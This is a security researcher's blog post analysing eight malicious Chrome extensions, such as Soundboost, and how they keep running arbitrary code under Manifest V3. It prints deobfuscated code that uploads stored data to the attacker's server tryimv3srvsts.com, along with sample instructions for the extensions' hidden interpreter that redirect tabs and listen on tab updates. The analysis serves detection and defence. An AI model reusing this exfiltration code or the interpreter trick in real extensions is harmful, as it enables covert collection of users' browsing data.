---
categories:
- security
- privacy
- add-ons
- google
date: 2023-06-02T12:11:33+0200
description: Eight malicious extensions still remain in Chrome Web Store. These use
  some interesting tricks to keep running arbitrary code despite restrictions of Manifest
  V3.
lastmod: '2023-06-02 20:17:33'
title: How malicious extensions hide running arbitrary code
---

Two days ago I wrote about the [malicious extensions I discovered in Chrome Web Store](/2023/05/31/more-malicious-extensions-in-chrome-web-store/). At some point this article got noticed by Avast. Once their team [confirmed my findings](https://blog.avast.com/malicious-extensions-chrome-web-store), Google finally reacted and started removing these extensions. Out of the 34 extensions I reported, only 8 extensions remain. These eight were all part of an update where I added 16 extensions to my list, an update that came too late for Avast to notice.

Note: Even for the removed extensions, it isn’t “mission accomplished” yet. Yes, the extensions can no longer be installed. However, the existing installations remain. From what I can tell, Google didn’t blocklist these extensions yet.

Avast ran their own search, and they found a bunch of extensions that I didn’t see. So how come they missed eight extensions? The reason seems to be: these are considerably different. They migrated to [Manifest V3](https://developer.chrome.com/docs/extensions/mv3/intro/mv3-overview/), so they had to find new ways of running arbitrary code that wouldn’t attract unnecessary attention.

**Update** (2023-06-03): These extensions have been removed from the Chrome Web Store as well.

{{< toc >}}

## Which extensions is this about?

The malicious extensions currently still in Chrome Web Store are:

| Name | Weekly active users | Extension ID|
|------|------------|-------------|
| Soundboost | 6,925,522 | chmfnmjfghjpdamlofhlonnnnokkpbao |
| Amazing Dark Mode | 2,228,049 | fbjfihoienmhbjflbobnmimfijpngkpa |
| Awesome Auto Refresh | 2,222,284 | djmpbcihmblfdlkcfncodakgopmpgpgh |
| Volume Frenzy | 1,626,760 | idgncaddojiejegdmkofblgplkgmeipk |
| Leap Video Downloader | 1,454,917 | bjlcpoknpgaoaollojjdnbdojdclidkh |
| Qspeed Video Speed Controller | 732,250 | pcjmcnhpobkjnhajhhleejfmpeoahclc |
| HyperVolume | 592,479 | hinhmojdkodmficpockledafoeodokmc |
| Light picture-in-picture | 172,931 | gcnceeflimggoamelclcbhcdggcmnglm |

## Is it even the same malware?

I found this latest variant of the malicious code thanks to Lukas Andersson who researched reputation manipulation in Chrome Web Store. He shared with me a list of extensions that manipulated reviews similarly to the extensions I already discovered. Some of these extensions in fact turned out malicious, with a bunch using malicious code that I didn’t see before.

But this isn’t evidence that all these extensions are in fact related. And the new variant even communicates with tryimv3srvsts[.]com instead of serasearchtop[.]com. So how can I be certain that it is the same malware?

The obfuscation approach gives it away however: lots of unnecessary conditional statements, useless variables and strings being pieced together. It’s exactly the same thing as I [described for the PDF Toolbox extension](/2023/05/16/malicious-code-in-pdf-toolbox-extension/) already. Also, there is this familiar mangled timestamp meant to prevent config downloads in the first 24 hours after installation. It merely moved: `localStorage` is no longer usable with Manifest V3, so the timestamp is being stored in [storage.local](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/storage/local).

The code once against masquerades as part of a legitimate library. This time, it has been added to the `parser` module of the Datejs library.

## The “config” downloads

The approach to downloading the instructions changed considerably however. I’ll use Soundboost extension as my example, given that it is by far the most popular. When downloading the “config” file, Soundboost might also upload data. With obfuscation removed, the code looks roughly like this:

```js
async function getConfig()
{
  let config = (await chrome.storage.local.get("<key>")).<key>;
  let options;
  if (config)
  {
    options = {
      method: "POST",
      body: JSON.stringify(config)
    };
  }
  else
  {
    config = {};
    options = {
      method: "GET"
    };
  }
  let response = await fetch(
    "https://tryimv3srvsts.com/chmfnmjfghjpdamlofhlonnnnokkpbao",
    options
  );
  let json = await response.json();
  Object.assign(config, json);
  if (config.l)
    chrome.storage.local.set({<key>: config});
  return config.l;
}
```

So the extension will retrieve the config from [storage.local](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/storage/local), send it to the server, merge it with the response and write it back to `storage.local`. But what’s the point of sending a config to the server that has been previously received from it?

I can see only one answer: by the time the config is sent to the server, additional data will be added to it. So this is a data collection and exfiltration mechanism: the instructions in `config.l`, when executed by the extension, will collect data and store it in the `storage.local` entry. And next time the extension starts up this data will be sent to the server.

This impression is further reinforced by the fact that the extension will reload itself every 12 hours. This makes sure that accumulated data will always be sent out after this time period, even if the user never closes their browser.

## Executing the instructions

Previously, Chrome extensions could always run arbitrary JavaScript code as content scripts. As this is a major source of security vulnerabilities, Manifest V3 disallowed that. Now running dynamic code is only possible by relaxing default [Content Security Policy restrictions](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_Security_Policy#default_content_security_policy). But that would raise suspicions, so malicious extensions would like to avoid it of course.

With sufficient determination, such restrictions can always be worked around however. For example, the Honey extension chose to [ship an entire JavaScript interpreter with it](/2020/10/28/what-would-you-risk-for-free-honey/). This allowed it to download and run JavaScript code without it being subject to the browser’s security mechanisms. The company was apparently so successful extracting data in this way that [PayPal bought it for $4 billion](https://www.forbes.com/sites/tomtaulli/2019/11/23/why-paypal-paid-4-billion-for-honey-science/).

A JavaScript interpreter is lots of code however. There are indications that the malicious code in Soundboost is being obfuscated manually, something that doesn’t work with large code quantities. So the instruction processing in Soundboost is a much smaller interpreter, one that supports only 8 possible actions. This minimalistic approach is sufficient to do considerable damage.

The interpreter works on arrays representing expressions, with the first array element indicating the type of the expression and the rest of them being used as parameters. Typically, these parameters will themselves be recursively resolved as expressions. Non-array expressions are left unchanged.

I tried out a bunch of instructions just to see that this approach is sufficient to abuse just about any extension privileges. The following instructions will print a message to console:

```js
[
  // Call console.log
  "@", [".", ["console"], "log"],
  // Verbatim call parameter
  "hi"
]
```

The following calls [chrome.tabs.update()](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/update) to redirect the current browser tab to another page:

```js
[
  // Call chrome.tabs.update
  "@", [".", [".", ["chrome"], "tabs"], "update"],
  // Verbatim call parameter
  {url: "https://example.com/"}
]
```

The malicious code also likely wants to add a [tabs.onUpdated](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/onUpdated) listener. This turned out to be more complicated. Not because of the necessity of creating a callback, the interpreter has you covered with the `"^"` expressions there. However, function calls performed with this interpreter won’t pass in a `this` argument, and `addListener` method doesn’t like that.

There might be multiple way to work around this issue, but the one I found was calling via [Reflect.apply](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Reflect/apply) and passing in a `this` argument explicitly. This also requires calling [Array constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Array) to create an array:

```js
[
  // Call Reflect.apply
  "@", [".", ["Reflect"], "apply"],
  // target parameter: chrome.tabs.onUpdated.addListener
  [".", [".", [".", ["chrome"], "tabs"], "onUpdated"], "addListener"],
  // thisArgument parameter: chrome.tabs.onUpdated
  [".", [".", ["chrome"], "tabs"], "onUpdated"],
  // argumentsList parameter
  [
    // Call Array constructor
    "@", ["Array"],
    // Array element parameter
    [
      // Create closure
      "^",
      [
        // Call console.log
        "@", [".", ["console"], "log"],
        // Pass in function arguments received by the closure
        ["#"]
      ]
    ]
  ]
]
```

These instructions successfully log any tab change reported to the `onUpdated` listener.

So this isn’t the most comfortable language to use, but with some tricks it can do pretty much anything. It also lacks flow control constructs other than `try .. catch`. Yet this is already sufficient to construct simple `if` blocks, triggering an exception to execute the `else` part. It should even be possible to emulate loops via recursive calls.

## What is this being used for?

As with the other extensions, I [haven’t actually seen the instructions](/2023/05/31/more-malicious-extensions-in-chrome-web-store/#what-does-it-actually-do) that the extensions receive from their server. So I cannot know for certain what they do when activated. Reviews of older extensions report them redirecting Google searches to Bing, which is definitely something these newer extensions could do as well.

As mentioned above however, the newer extensions clearly transmit data to their server. What kind of data? All of them have access to all websites, so it would be logical if they collected full browsing profiles. The older extensions likely did as well, but this isn’t something that users would easily notice.

Quite remarkably, all the extensions also have the `scripting` permission which is unlikely to be a coincidence. This permission allows the use of the [scripting.executeScript API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/scripting/executeScript), meaning running JavaScript code in the context of any website loaded in the browser. The catch however is: this API won’t run arbitrary code, only code that is already part of the extension.

I’m not entirely certain what trick the extensions pull to work around this limitation, but they’ve certainly thought of something. Most likely, their trick involves loading `background.js` into pages – while this file is supposed to run as the extension’s background worker, it’s part of the extension and the `scripting.executeScript` API will allow using it. One indirect confirmation is the obfuscated code in `background.js` registering a listener for the `message` event, despite the fact that nothing should be able to send such messages as long as the script runs as background worker.
